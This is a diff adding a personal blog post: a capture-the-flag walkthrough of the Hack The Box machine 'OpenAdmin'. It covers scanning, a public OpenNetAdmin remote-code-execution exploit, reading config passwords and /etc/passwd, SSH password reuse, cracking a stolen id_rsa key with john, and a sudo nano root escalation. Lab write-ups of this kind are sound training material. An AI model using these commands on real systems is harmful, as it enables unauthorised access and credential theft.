@@ -1,0 +1,367 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="">
+<meta name="description" content="Introduction IP: 10.10.10.171
+Difficulty: Easy
+Initial nmap Scan Running the initial nmap scan: nmap -sC -sV -oN nmap 10.10.10.171
+Gave me the following:
+From the nmap scan, you can see that there isn&#39;t too much here.
+  The machine is running Ubuntu Linux
+  Port 22 - The ssh protocol, can’t really access this without credentials
+  Port 80 - HTTP port, usually hosts web pages etc. In this case, it&#39;s the Ubuntu Apache web server" />
+<meta name="keywords" content="homepage, hacking, ctf, htb, hack, box, programming, blog, informatics, osint, ethical" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="https://xyniath.github.io/posts/openadmin/" />
+
+
+    <title>
+        
+            Openadmin :: Xyniath  — Hacking and stuff
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.2.1/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="/main.min.5dcefbf8102eb536dd3e2de53ffebfa58599ab2435c241a0db81728a5e015f2e.css">
+
+
+
+
+<meta itemprop="name" content="Openadmin">
+<meta itemprop="description" content="Introduction IP: 10.10.10.171
+Difficulty: Easy
+Initial nmap Scan Running the initial nmap scan: nmap -sC -sV -oN nmap 10.10.10.171
+Gave me the following:
+From the nmap scan, you can see that there isn&#39;t too much here.
+  The machine is running Ubuntu Linux
+  Port 22 - The ssh protocol, can’t really access this without credentials
+  Port 80 - HTTP port, usually hosts web pages etc. In this case, it&#39;s the Ubuntu Apache web server">
+<meta itemprop="datePublished" content="2020-01-21T21:08:55&#43;00:00" />
+<meta itemprop="dateModified" content="2020-01-21T21:08:55&#43;00:00" />
+<meta itemprop="wordCount" content="1149">
+<meta itemprop="image" content="https://xyniath.github.io/"/>
+
+
+
+<meta itemprop="keywords" content="untagged," /><meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://xyniath.github.io/"/>
+
+<meta name="twitter:title" content="Openadmin"/>
+<meta name="twitter:description" content="Introduction IP: 10.10.10.171
+Difficulty: Easy
+Initial nmap Scan Running the initial nmap scan: nmap -sC -sV -oN nmap 10.10.10.171
+Gave me the following:
+From the nmap scan, you can see that there isn&#39;t too much here.
+  The machine is running Ubuntu Linux
+  Port 22 - The ssh protocol, can’t really access this without credentials
+  Port 80 - HTTP port, usually hosts web pages etc. In this case, it&#39;s the Ubuntu Apache web server"/>
+
+
+
+
+
+    <meta property="article:published_time" content="2020-01-21 21:08:55 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+    </head>
+
+    <body class="">
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text">cd ~/home/xyniath</span>
+            <span class="logo__cursor" style=""></span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="https://xyniath.github.io/about-me/">About Me</a></li><li><a href="https://xyniath.github.io/posts/">Blog</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+
+            <span class="theme-toggle unselectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+</span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>6 minutes
+
+            
+
+            </p>
+        </div>
+
+        <article>
+            <h1 class="post-title">
+                <a href="https://xyniath.github.io/posts/openadmin/">Openadmin</a>
+            </h1>
+
+            
+
+            <div class="post-content">
+                <h2 id="introduction">Introduction</h2>
+<p><strong>IP</strong>: 10.10.10.171</p>
+<p><strong>Difficulty</strong>: Easy</p>
+<h2 id="initial-nmap-scan">Initial nmap Scan</h2>
+<p>Running the initial <code>nmap</code> scan:
+<code>nmap -sC -sV -oN nmap 10.10.10.171</code></p>
+<p>Gave me the following:</p>
+<p><img src="/posts/openadmin/nmapscan.png" alt="Nmap Scan"></p>
+<p>From the <code>nmap</code> scan, you can see that there isn't too much here.</p>
+<ul>
+<li>
+<p>The machine is running <strong>Ubuntu Linux</strong></p>
+</li>
+<li>
+<p><strong>Port 22</strong> - The ssh protocol, can’t really access this without credentials</p>
+</li>
+<li>
+<p><strong>Port 80</strong> - HTTP port, usually hosts web pages etc. In this case, it's the Ubuntu Apache web server</p>
+</li>
+</ul>
+<p>With the port 80 being my only option, I opt to investigate the webpage.</p>
+<h2 id="enumerating-port-80">Enumerating Port 80</h2>
+<p>When I go to 10.10.10.171:80, it brings me to the <strong>Apache2 Ubuntu Default Page</strong>.</p>
+<p><img src="/posts/openadmin/defaultpage.png" alt="Apache Default Page"></p>
+<p>As there are no links on the page (or in the webpage source code), leading elsewhere locally, I decided to do a <code>dirbuster</code> scan. With the following settings</p>
+<p><img src="/posts/openadmin/dirbuster1.png" alt="Dirbuster Scan Settings"></p>
+<p>After a few seconds, directories are already being found.
+<img src="/posts/openadmin/dirbuster2.png" alt="Dirbuster results"></p>
+<p>I first check the <strong>/music/</strong> directory</p>
+<p><img src="/posts/openadmin/musicsite.png" alt="Sol Music"></p>
+<p>It brings me to an internal website called SolMusic. Going through the indexing on the website, it mainly takes me to /music/index.html even when the link text specifies another function, than return to a blog page.</p>
+<p>I then try the /ona/ directory</p>
+<p><img src="/posts/openadmin/ona.png" alt="Open Net Admin"></p>
+<p>Already, this immediately grabs my attention. The Yellow notice to the left stating that the current version is <strong>18.1.1</strong>.
+Clicking on the <strong>DOWNLOAD</strong> button takes me to OpenNetAdmin, so I can already try find an exploit for the current version. So I do.</p>
+<h2 id="exploiting-opennetadmin">Exploiting OpenNetAdmin</h2>
+<p>The first link after searching <strong>OpenNetAdmin v18.1.1</strong> links to a remote code execution exploit linked <a href="https://www.exploit-db.com/exploits/47691"><strong>here</strong></a>.</p>
+<p><img src="/posts/openadmin/scriptcat.png" alt="Script Contents"></p>
+<p>I then renamed it to script.sh, and executed the command:</p>
+<p><code>chmod +x script.sh</code> to give execute permissions to the script.</p>
+<p>To use the script you run:
+<code>./script.sh http://10.10.10.171/ona/</code></p>
+<p><img src="/posts/openadmin/scriptexecute.png" alt="Exploitation"></p>
+<p>Executing <code>whoami</code> returned www-data as the current user we're logged in as.</p>
+<p>This script didn't allow for directory traversal, so using commands like <code>ls dirname/</code> to see the contents of a directory was necessary to see what files were in a directory, then execute <code>cat direname/filname</code>.</p>
+<p>Looking through the files, I came across <code>config/auth_ldap.config.php</code>this had a bind pw, but this probably isn't what we're looking for.</p>
+<p><img src="/posts/openadmin/ldap.png" alt="LDAP"></p>
+<p>After digging a littlebit futher, I see <code>local/config/database_settings.inc.php</code> and this contains an array of information, more importantly the servers db password and login.</p>
+<p><img src="/posts/openadmin/dbpass.png" alt="DB Settings File"></p>
+<p>In this file, we find:</p>
+<p><strong>db_login</strong> = ona_sys</p>
+<p><strong>db_passwd</strong> = n1nj4W4rri0R!</p>
+<p>This doesn't*look like a default password, so <em>someone</em> will have changed this from a default value.</p>
+<p>So, what I do now is enumerate using the shell that I have obtained, and try to find accounts on the system.</p>
+<p>So I just typed <code>cat /etc/passwd</code></p>
+<p><img src="/posts/openadmin/etcpasswd.png" alt="passwd File"></p>
+<p><code>cat /home/</code> would also give user accounts</p>
+<p><img src="/posts/openadmin/home.png" alt="Home Directory"></p>
+<p>Now we have a list of potenial users and a password</p>
+<p><strong>Users</strong> - jimmy, joanna</p>
+<p><strong>Password</strong> - n1nj4W4rri0R!</p>
+<p>What I decide to do with this information, is try logging in to the machine using ssh, as it is common (and bad practice) for someone to use the <em>same</em> credentials in more than one place.</p>
+<p>So, I exit the shell.</p>
+<h2 id="logging-in-as-a-user">Logging in as a User</h2>
+<p>I attempt to ssh into the machine, starting with <strong>jimmy</strong></p>
+<p><code> ssh jimmy@10.10.10.171</code></p>
+<p>Sure enough, <strong>jimmy</strong> and <strong>n1nj4W4rri0R!</strong> were the combination to log in to his account!</p>
+<p>I also tried the password on the <strong>joanna</strong> account just to make sure, and the credentials did not work.</p>
+<p><img src="/posts/openadmin/jimmy.png" alt="Jimmy SSH"></p>
+<p>There was no user.txt for jimmy, so it seems like we will be looking to getting access into the <strong>joanna</strong> account.</p>
+<h2 id="machine-enumeration">Machine Enumeration</h2>
+<p>Now that I was logged into the <strong>jimmy</strong> account, I started to enumerate, and see what I could find.</p>
+<p>But before this, I checked to see if I could run any enumeration scripts.</p>
+<p>On my machine, I downloaded the linenum.sh script which can be found <a href="https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"><strong>here</strong></a>.</p>
+<p><code>curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh &gt; linenum.sh</code></p>
+<p>Started a python server</p>
+<p><code>python -m SimpleHTTPServer 80</code></p>
+<p>And then proceeded to download the file using the target machine</p>
+<p><code>curl 10.10.14.4/linenum.sh &gt; linenum.sh</code></p>
+<p>After it downloaded, it wasn't executable so I used:
+<code>chmod +x linenum.sh</code></p>
+<p>Then I ran the script <code>./linenum.sh</code> and waited.</p>
+<p>Looking through the script, theres a lot that stood out. It shows that <strong>jimmy</strong> is in two groups, <strong>jimmy</strong> &amp; <strong>internal</strong>. <strong>Internal</strong> seemed interesting.</p>
+<p>There was also a lot of information about machine connections, internally and externally(which I will come to later on)</p>
+<p>I checked to see if there was a folder named internal using:</p>
+<p><code>find / -type d -name internal 2&gt;dev/null</code></p>
+<p>The <code>2&gt;dev/null</code> removes any <strong>permission denied</strong> warnings, and gives a clearer output.</p>
+<p><img src="/posts/openadmin/internalsearch.png" alt="Internal Search"></p>
+<p>Immediately, the /var/www/internal grabs my attention. I then navigate to this directory.</p>
+<p>In this dir, there are 3 files.</p>
+<ul>
+<li>index.php</li>
+<li>logout.php</li>
+<li>main.php</li>
+</ul>
+<p>I looked into each file, to see if there was anything interesting&hellip; and there was, in main.php
+<img src="/posts/openadmin/mainphp.png" alt="Internal Search"></p>
+<p>This file is getting joannas ssh id rsa key with
+<code>$output = shell_exec('cat /home/joanna/.ssh/id_rsa');</code>
+and then outputting it to the screen.</p>
+<p>it also says &ldquo;Don't forget your &ldquo;ninja&rdquo; password&rdquo;
+I needed a way to execute this.</p>
+<p>I presume this is an internal webserver, that can only be accessed from inside the network, and seen as I have access to this machine, that's not an issue.</p>
+<p>I just had to find where this page is being displayed. And looking back at the output from the <strong>linenum.sh</strong> script I saw this.</p>
+<p><img src="/posts/openadmin/serverconnections.png" alt="Connection List"></p>
+<p>From here I saw that there are 3 internal connections, and 2 external.</p>
+<p><strong>Internal Servers</strong></p>
+<ul>
+<li>127.0.0.53:53</li>
+<li>127.0.0.1:3306</li>
+<li>127.0.0.1:52846</li>
+</ul>
+<p>I used <code>curl ip:port/main.php </code> on each internal server.</p>
+<p><strong>127.0.0.152846/main.php</strong> returned the rsa key!</p>
+<p><img src="/posts/openadmin/rsa.png" alt="Internal Search"></p>
+<h2 id="cracking-with-rsa-private-key">Cracking With RSA Private Key</h2>
+<p>I copied the RSA private key into a new file called id_rsa.</p>
+<p>I then used ssh2john to convert this RSA key into a hash, crackable by John.</p>
+<p><code>/usr/share/john/ssh2john.py id_rsa &gt; crack.txt</code></p>
+<p>This created a file called crack.txt containing the hash.</p>
+<p>To crack this file, I use:
+<code>john --wordlist=/root/Hacking/Wordlists/rockyou.txt crack.txt</code></p>
+<p>Within a few seconds&hellip;
+<img src="/posts/openadmin/password.png" alt="Cracked"></p>
+<p>I got the password as <strong>bloodninjas</strong>!</p>
+<p>I could then exit from the <strong>jimmy</strong> ssh session and attempt to login as joanna:</p>
+<p><code>ssh -i id_rsa joanna@10.10.10.171</code></p>
+<p>This gave me an error that the key was &lsquo;too open&rsquo; so <code>chmod 400 id_rsa</code> fixed the issue</p>
+<p>typed <strong>bloodninjas</strong> as the password and&hellip;
+<img src="/posts/openadmin/joanna.png" alt="User"></p>
+<p>I was in! And just had to read the user.txt file for user flag.</p>
+<h2 id="getting-root">Getting Root</h2>
+<p>Whilst trying to get root for this machine, I was introduced to GTFOBins. GTFOBins is a huge list of using legitimate functions of Unix binaries to bypass local security restrictions on a machine.</p>
+<p>In this box, I use functions inside of nano to gain a root level shell.</p>
+<p><img src="/posts/openadmin/gtfobin.png" alt="GTFOBin"></p>
+<p>So I just followed the instructions. And at first I got my shell but it didn't escalate privileges.</p>
+<p>I then tried around a bit and found that further down the nano page, there's a sudo escalation.</p>
+<p><img src="/posts/openadmin/gtfowin.png" alt="GTFOWin"></p>
+<p><code>sudo nano /opt/priv</code> worked and gave me a new shell, where running <code>whoami</code> showed that I was root.</p>
+<p><img src="/posts/openadmin/shell.png" alt="Root Shell"></p>
+<p>Now all I had to do was navigate to /root/ and get the flag.</p>
+<p><img src="/posts/openadmin/rootxt.png" alt="Root"></p>
+<p>And that's it!</p>
+<h2 id="what-i-learnt-from-this-box">What I Learnt From This Box</h2>
+<ul>
+<li>GTFOBins</li>
+<li>The use of internal webservers</li>
+<li>Cracking RSA Private Keys</li>
+<li>Some more enumeration skills</li>
+</ul>
+
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+                <p>
+                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg><span class="tag"><a href="https://xyniath.github.io/tags/untagged">untagged</a></span>
+                </p>
+
+            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>1149 Words</p>
+
+            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>2020-01-21 21:08 &#43;0000</p>
+        </div>
+
+        
+            <div class="pagination">
+                <div class="pagination__title">
+                    <span class="pagination__title-h">Read other posts</span>
+                    <hr />
+                </div>
+
+                <div class="pagination__buttons">
+                    
+
+                    
+                        <span class="button next">
+                            <a href="https://xyniath.github.io/posts/monteverde/">
+                                <span class="button__text">Monteverde</span>
+                                <span class="button__icon">→</span>
+                            </a>
+                        </span>
+                    
+                </div>
+            </div>
+        
+
+        
+    </main>
+
+            </div>
+
+            
+                <!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
+<html>
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+  <meta http-equiv="Content-Style-Type" content="text/css">
+  <title></title>
+  <meta name="Generator" content="Cocoa HTML Writer">
+  <meta name="CocoaVersion" content="1894.2">
+  <style type="text/css">
+  </style>
+</head>
+<body>
+</body>
+</html>
+
+            
+        </div>
+
+        
+
+
+
+
+<script type="text/javascript" src="/bundle.min.2d5469329143160ae2456a69c3c76dc2d0a3b212b46afe291a51bd68650ed6f8697e001dab54f1c272c77ce08092a8c55e5bb4314e0ee334aab4b927ec896638.js" integrity="sha512-LVRpMpFDFgriRWppw8dtwtCjshK0av4pGlG9aGUO1vhpfgAdq1TxwnLHfOCAkqjFXlu0MU4O4zSqtLkn7IlmOA=="></script>
+
+
+
+    </body>
+</html>
